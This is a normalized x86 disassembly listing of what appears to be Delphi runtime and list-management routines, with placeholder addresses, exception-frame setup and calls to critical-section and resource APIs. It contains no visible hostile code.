mov eax [ eax + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_413eec
inc esi
xor edi edi
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov edx edi
call sub_414098
mov ebx eax
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_412eec
test al al
je r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_413eec
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov edx edi
call sub_414098
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
je r-xdata
sub_4135ca
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
call sub_403514
pop [ fs : 0x0 ]
add esp 0xc
sub_4135f0
push ebx
push esi
call sub_403524
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_403198
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403188
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40350c
sub_413620
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ rw-data ]
call sub_4133b0
xor edx edx
push ebp
push sub_413697
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_413468
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
call sub_4039d0
jmp r-xdata
mov eax [ edi + 0x4 ]
mov edx esi
call sub_414098
mov edx [ ebp - 0x4 ]
call sub_412e8c
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4136b4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor edx edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_413714
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405af8
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba04
call sub_403924
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41371b
lea eax [ ebp - 0xc ]
call sub_403ee8
retn
sub_413720
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_4133b0
xor eax eax
push ebp
push sub_413766
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ rw-data ]
call sub_413214
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41376d
mov eax [ rw-data ]
call sub_413468
retn
sub_413774
push ebx
push esi
mov esi eax
mov eax esi
call sub_413720
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov eax esi
call sub_4136b4
sub_413794
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_4133b0
xor eax eax
push ebp
push sub_4137f9
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4133d4
test al al
je r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4133bc
cmp ebx [ r-xdata ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413800
mov eax [ rw-data ]
call sub_413468
retn
mov eax ebx
call sub_403124
mov ebx eax
sub_413804
push ebp
mov ebp esp
push ebx
push esi
mov ecx edx
test ecx ecx
js r-xdata
mov eax esp
mov esi edx
test esi esi
jl r-xdata
mov ebx [ eax + ecx * 4 ]
dec ecx
push ebx
jns r-xdata
mov esi [ ebp - 0x8 ]
mov ebx [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
inc esi
mov ebx eax
mov eax [ ebx ]
call sub_413794
add ebx 0x4
dec esi
jne r-xdata
sub_413838
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_4133b0
xor eax eax
push ebp
push sub_41387a
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ rw-data ]
call sub_413474
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413881
mov eax [ rw-data ]
call sub_413468
retn
sub_413884
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_4133b0
xor eax eax
push ebp
push sub_4138c6
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ rw-data ]
call sub_413418
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4138cd
mov eax [ rw-data ]
call sub_413468
retn
sub_4138d0
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
call sub_4133b0
xor eax eax
push ebp
push sub_413917
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov edx ebx
mov eax [ rw-data ]
call sub_4132e8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41391e
mov eax [ rw-data ]
call sub_413468
retn
sub_413924
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_4133b0
xor eax eax
push ebp
push sub_413972
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x4 ] eax
mov edx ebx
mov eax [ rw-data ]
call sub_4130b4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413979
mov eax [ rw-data ]
call sub_413468
retn
sub_413984
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
int3
sub_4139d8
push ebp
mov ebp esp
test dl dl
je r-xdata
mov [ eax + 0x4 ] ecx
mov ecx [ ebp + 0xc ]
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax + 0xc ] ecx
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_4034bc
pop ebp
retn 0x8
call sub_403514
pop [ fs : 0x0 ]
add esp 0xc
sub_413a10
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push esi
push edi
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4139d8
mov edx eax
mov eax [ rw-data ]
call sub_41437c
pop edi
pop esi
pop ebx
retn
sub_413a3c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi eax
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
call sub_414404
mov esi eax
xor edx edx
push ebp
push sub_413aa6
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_414468
retn
mov edx ebx
mov eax esi
call sub_414098
cmp edi [ eax + 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov eax [ eax + 0x8 ]
mov [ ebp - 0x4 ] eax
call sub_4039d0
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_413ab8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edi eax
mov esi [ ebp + 0x8 ]
test esi esi
jl r-xdata
xor eax eax
inc esi
lea ebx [ ecx + 0x4 ]
add ebx 0x8
dec esi
jne r-xdata
mov al 0x1
mov edx [ ebp - 0x4 ]
mov ecx [ ebx - 0x4 ]
mov [ edx ] ecx
jmp r-xdata
mov edx edi
mov eax [ ebx ]
call sub_407d04
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_413af8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi [ ebp + 0x8 ]
test esi esi
jl r-xdata
mov [ ebp - 0x5 ] 0x0
inc esi
mov ebx [ ebp - 0x4 ]
add ebx 0x8
dec esi
jne r-xdata
mov [ ebp - 0x5 ] 0x1
mov eax edi
mov edx [ ebx + 0x4 ]
call sub_403f3c
jmp r-xdata
cmp eax [ ebx ]
jne r-xdata
mov al [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_413b3c
push ebx
push esi
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
mov esi ebx
mov edx esi
mov eax [ rw-data ]
call sub_4140f4
test eax eax
jge r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403168
mov [ rw-data ] eax
pop esi
pop ebx
retn
mov edx esi
mov eax [ rw-data ]
call sub_413eec
sub_413b94
push ebx
push esi
push edi
mov esi eax
xor eax eax
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ rw-data ]
mov ebx [ edx + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_414098
mov edi eax
mov eax esi
call edi
test eax eax
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_413bd4
push ebx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax ebx
call sub_413b94
test eax eax
sete al
pop ebx
retn
mov eax ebx
call [ rw-data ]
pop ebx
retn
sub_413bf8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov edi eax
test ebx ebx
jne r-xdata
push 0xa
mov eax edi
call sub_4043a8
push eax
push ebx
call FindResourceA
test eax eax
setne al
test al al
je r-xdata
mov ebx [ rw-data ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
push edi
push 0xa
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_416580
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_413c6c
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ esi ]
mov eax [ ebp - 0x4 ]
call sub_416080
mov [ esi ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403198
retn
sub_413c7c
push ebx
call sub_405d64
mov ebx [ eax + 0xc ]
test ebx ebx
jne r-xdata
call sub_405d64
mov edx [ eax + 0x8 ]
mov eax ebx
call sub_413eec
mov dl 0x1
mov eax [ r-xdata ]
call sub_403168
mov ebx eax
call sub_405d64
mov [ eax + 0x8 ] ebx
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403168
mov ebx eax
call sub_405d64
mov [ eax + 0xc ] ebx
sub_413cd4
push ebx
push esi
push edi
call sub_405d64
mov edi [ eax + 0x8 ]
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_414098
mov edx [ eax ]
call [ edx + 0xc ]
inc esi
dec ebx
jne r-xdata
sub_413d04
push ebx
push esi
call sub_405d64
mov eax [ eax + 0x8 ]
call sub_403198
call sub_405d64
mov ebx [ eax + 0xc ]
mov eax ebx
call sub_414180
mov esi eax
call sub_405d64
mov [ eax + 0x8 ] esi
mov edx [ ebx + 0x8 ]
dec edx
mov eax ebx
call sub_413f38
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
call sub_405d64
xor edx edx
mov [ eax + 0xc ] edx
mov eax ebx
call sub_403198
sub_413d60
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
xor edx edx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_413df6
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
cmp esi [ r-xdata ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413dfd
lea eax [ ebp - 0x4 ]
call sub_403ee8
retn
mov eax [ ebp + 0x8 ]
cmp esi [ eax - 0x8 ]
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_403124
call sub_413d60
pop ecx
mov ebx eax
lea edx [ ebp - 0x104 ]
mov eax esi
call sub_4030e8
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_40414c
mov eax [ ebp - 0x4 ]
push eax
mov eax esi
call sub_404fb0
call sub_405000
mov edx eax
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x4 ]
pop eax
call sub_413bf8
or bl al
sub_413e08
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor eax eax
push ebp
push sub_413eb6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x1c ]
and ax [ r-xdata ]
mov dx [ r-xdata ]
cmp dx ax
sete [ ebp - 0xa ]
cmp [ ebp - 0xa ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_413e97
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov eax [ ebp - 0x4 ]
call sub_4030e0
call sub_413d60
pop ecx
mov [ ebp - 0x9 ] al
cmp [ ebp - 0xa ] 0x0
je r-xdata
call sub_413c7c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413e9e
cmp [ ebp - 0xa ] 0x0
je r-xdata
call sub_413cd4
retn
call sub_413d04
sub_413ecc
push ebx
push esi
call sub_403524
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x8 ]
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40350c
sub_413eec
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x8 ]
cmp esi [ ebx + 0xc ]
jne r-xdata
mov eax [ ebx + 0x4 ]
mov [ eax + esi * 4 ] edi
inc [ ebx + 0x8 ]
test edi edi
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax esi
pop edi
pop esi
pop ebx
retn
xor ecx ecx
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_413f38
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_413fd4
cmp esi [ ebx + 0x8 ]
jl r-xdata
test edi edi
je r-xdata
sub eax esi
mov ecx eax
shl ecx 0x2
mov eax [ ebx + 0x4 ]
lea edx [ eax + esi * 4 ]
mov eax [ ebx + 0x4 ]
lea eax [ eax + esi * 4 + 0x4 ]
call sub_4028d8
mov edx esi
mov eax ebx
call sub_414098
mov edi eax
dec [ ebx + 0x8 ]
mov eax [ ebx + 0x8 ]
cmp esi eax
jge r-xdata
pop edi
pop esi
pop ebx
retn
mov cl 0x2
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_413f9c
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ebx edx
call sub_413f98
push eax
mov [ esp + 0x4 ] esi
mov [ esp + 0x8 ] 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x0
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba04
jmp sub_403924
sub_413fd4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi ecx
mov ebx edx
xor eax eax
push ebp
push sub_41401c
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_405af8
mov edx [ ebp - 0x4 ]
mov ecx esi
mov eax [ r-xdata ]
call sub_413f9c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414023
lea eax [ ebp - 0x4 ]
call sub_403ee8
retn
sub_414028
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_413fd4
cmp esi [ ebx + 0x8 ]
jl r-xdata
mov edx [ rw-data ]
mov ecx edi
mov eax [ ebx ]
call sub_413fd4
cmp edi [ ebx + 0x8 ]
jl r-xdata
test edi edi
jl r-xdata
mov eax [ ebx + 0x4 ]
mov edx [ eax + esi * 4 ]
mov ecx [ ebx + 0x4 ]
mov ecx [ ecx + edi * 4 ]
mov [ eax + esi * 4 ] ecx
mov [ eax + edi * 4 ] edx
pop edi
pop esi
pop ebx
retn
sub_414098
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_413fd4
cmp esi [ ebx + 0x8 ]
jl r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + esi * 4 ]
pop esi
pop ebx
retn
sub_4140c0
mov edx [ eax + 0xc ]
cmp edx 0x40
jle r-xdata
cmp edx 0x8
jle r-xdata
mov ecx edx
test ecx ecx
jns r-xdata
mov ecx 0x4
mov ecx 0x10
jmp r-xdata
sar ecx 0x2
jmp r-xdata
add ecx 0x3
add ecx edx
mov edx ecx
call sub_4141fc
retn
sub_4140f4
push ebx
xor ecx ecx
jmp r-xdata
cmp ecx [ eax + 0x8 ]
jge r-xdata
cmp ecx [ eax + 0x8 ]
jne r-xdata
mov ebx [ eax + 0x4 ]
cmp edx [ ebx + ecx * 4 ]
jne r-xdata
mov eax ecx
pop ebx
retn
or ecx 0xffffffff
inc ecx
sub_414114
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_413fd4
cmp esi [ ebx + 0x8 ]
jle r-xdata
mov eax [ ebx + 0x8 ]
cmp esi eax
jge r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax [ ebx + 0x8 ]
cmp eax [ ebx + 0xc ]
jne r-xdata
mov eax [ ebx + 0x4 ]
mov [ eax + esi * 4 ] edi
inc [ ebx + 0x8 ]
test edi edi
je r-xdata
sub eax esi
mov ecx eax
shl ecx 0x2
mov eax [ ebx + 0x4 ]
lea edx [ eax + esi * 4 + 0x4 ]
mov eax [ ebx + 0x4 ]
lea eax [ eax + esi * 4 ]
call sub_4028d8
pop edi
pop esi
pop ebx
retn
xor ecx ecx
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_41418c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_413fd4
cmp esi [ ebx + 0x8 ]
jl r-xdata
pop edi
pop esi
pop ebx
retn
mov [ edx + esi * 4 ] edi
test eax eax
je r-xdata
mov edx [ ebx + 0x4 ]
mov eax [ edx + esi * 4 ]
cmp edi eax
je r-xdata
test edi edi
je r-xdata
mov cl 0x2
mov edx eax
mov eax ebx
mov esi [ eax ]
call [ esi + 0x4 ]
xor ecx ecx
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_4141dc
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_4140f4
mov esi eax
test esi esi
jl r-xdata
mov eax esi
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_413f38
sub_4141fc
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x8 ]
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_413fd4
cmp esi 0x7ffffff
jle r-xdata
pop esi
pop ebx
retn
mov edx esi
shl edx 0x2
lea eax [ ebx + 0x4 ]
call sub_40271c
mov [ ebx + 0xc ] esi
cmp esi [ ebx + 0xc ]
je r-xdata
sub_414238
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_413fd4
cmp esi 0x7ffffff
jle r-xdata
mov eax [ ebx + 0x8 ]
cmp esi eax
jle r-xdata
mov edx esi
mov eax ebx
call sub_4141fc
cmp esi [ ebx + 0xc ]
jle r-xdata
mov ebp eax
dec ebp
mov edi esi
sub edi ebp
jg r-xdata
mov edx [ ebx + 0x4 ]
lea edx [ edx + eax * 4 ]
mov ecx esi
sub ecx eax
mov eax ecx
shl eax 0x2
xor ecx ecx
xchg edx eax
call sub_402b98
jmp r-xdata
mov [ ebx + 0x8 ] esi
pop ebp
pop edi
pop esi
pop ebx
retn
dec edi
mov edx ebp
mov eax ebx
call sub_413f38
dec ebp
inc edi
jne r-xdata
sub_4142ac
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403168
lea eax [ esi + 0x8 ]
push eax
call InitializeCriticalSection
mov dl 0x1
mov eax [ r-xdata ]
call sub_403168
mov [ esi + 0x4 ] eax
mov [ esi + 0x20 ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034bc
mov eax esi
pop esi
pop ebx
retn
call sub_403514
pop [ fs : 0x0 ]
add esp 0xc
sub_414300
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_403524
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_414404
xor eax eax
push ebp
push sub_414362
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_403198
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_403188
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414369
mov eax [ ebp - 0x4 ]
call sub_414468
mov eax [ ebp - 0x4 ]
add eax 0x8
push eax
call DeleteCriticalSection
retn
sub_41437c
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_414404
xor eax eax
push ebp
push sub_4143f8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_413eec
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_4140f4
inc eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4143ff
mov eax [ ebp - 0x4 ]
call sub_414468
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x2
jne r-xdata
mov edx [ rw-data ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov eax [ eax ]
mov ecx ebx
call sub_413fd4
sub_414418
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_414404
xor eax eax
push ebp
push sub_41445b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_4141dc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414462
mov eax [ ebp - 0x4 ]
call sub_414468
retn
sub_414474
push ebx
push esi
call sub_403524
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4144c8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403188
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40350c
sub_4144c8
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x4 ]
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
test esi esi
jge r-xdata
lea eax [ esi + 0x20 ]
dec eax
test eax eax
jns r-xdata
mov eax ebx
call sub_4144a4
sar eax 0x5
mov edi eax
shl edi 0x2
mov eax [ ebx + 0x4 ]
add eax 0x20
dec eax
test eax eax
jns r-xdata
add eax 0x1f
sar eax 0x5
mov ebp eax
shl ebp 0x2
cmp ebp edi
je r-xdata
add eax 0x1f
mov [ ebx + 0x4 ] esi
xor eax eax
mov [ esp ] eax
test edi edi
je r-xdata
test ebp ebp
je r-xdata
mov eax edi
call sub_4026dc
mov [ esp ] eax
mov eax [ esp ]
xor ecx ecx
mov edx edi
call sub_402b98
mov eax [ esp ]
mov [ ebx + 0x8 ] eax
cmp [ esp ] 0x0
je r-xdata
mov edx ebp
mov eax [ ebx + 0x8 ]
call sub_4026fc
mov edx edi
mov eax ebp
call sub_4144bc
mov ecx eax
mov edx [ esp ]
mov eax [ ebx + 0x8 ]
call sub_4028d8
sub_41456c
cmp edx [ eax + 0x4 ]
jae r-xdata
cmp edx 0x0
jl sub_4144a4
mov eax [ eax + 0x8 ]
or cl cl
je r-xdata
push eax
push edx
push ecx
inc edx
call sub_4144c8
pop ecx
pop edx
pop eax
jmp r-xdata
btr [ eax ] edx
retn
bts [ eax ] edx
retn
sub_4145b0
push ebx
push esi
push edi
push ecx
mov ebx eax
mov eax [ ebx + 0x4 ]
add eax 0x20
dec eax
test eax eax
jns r-xdata
sar eax 0x5
dec eax
test eax eax
jl r-xdata
add eax 0x1f
mov eax [ ebx + 0x4 ]
inc eax
mov [ esp ] eax
xor esi esi
inc esi
dec [ esp ]
jne r-xdata
mov eax [ ebx + 0x8 ]
mov edi [ eax + esi * 4 ]
xor eax eax
mov eax [ ebx + 0x8 ]
mov edx [ r-xdata ]
cmp edx [ eax + esi * 4 ]
je r-xdata
jb r-xdata
and edx 0x7f
bt edi edx
inc eax
cmp al 0x20
jne r-xdata
mov edx esi
shl edx 0x5
and eax 0x7f
add edx eax
mov eax edx
mov edx [ ebx + 0x4 ]
cmp eax edx
jl r-xdata
mov edx eax
cmp dl 0x1f
ja r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax edx
jmp r-xdata
sub_414628
push ebx
push esi
call sub_403524
mov ebx edx
mov esi eax
mov eax esi
call sub_416d20
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403188
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40350c
sub_414668
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41471e
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_403f80
lea edx [ ebp - 0x104 ]
mov eax [ esi ]
call sub_4030e8
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_40414c
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x114 ] eax
mov [ ebp - 0x110 ] 0xb
lea edx [ ebp - 0x104 ]
mov eax [ ebx ]
call sub_4030e8
lea eax [ ebp - 0x104 ]
mov [ ebp - 0x10c ] eax
mov [ ebp - 0x108 ] 0x4
lea eax [ ebp - 0x114 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bac0
call sub_403924
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414725
lea eax [ ebp - 0x4 ]
call sub_403ee8
retn
sub_414744
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_4147d9
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x104 ]
mov eax [ ebx ]
call sub_4030e8
lea edx [ ebp - 0x104 ]
mov eax edi
call sub_40414c
mov eax ebx
mov si 0xffff
call sub_403394
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4147e0
lea eax [ ebp - 0x4 ]
call sub_403ee8
retn
mov eax ebx
mov si 0xffff
call sub_403394
lea edx [ ebp - 0x4 ]
mov si 0xfffe
call sub_403394
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push [ ebp - 0x4 ]
push r-xdata
push [ edi ]
mov eax edi
mov edx 0x3
call sub_404268
sub_4147eb
inc [ ecx ]
add [ eax ] al
add [ esi ] ch
add [ eax ] al
add [ ebx ] dh
rol bl 0x90
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_4033ec
mov eax ebx
mov si 0xffff
call sub_403394
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffff
call sub_403394
push eax
lea eax [ ebx + 0x4 ]
call sub_405634
mov ecx eax
mov edx r-xdata
pop eax
call sub_40324c
sub_414836
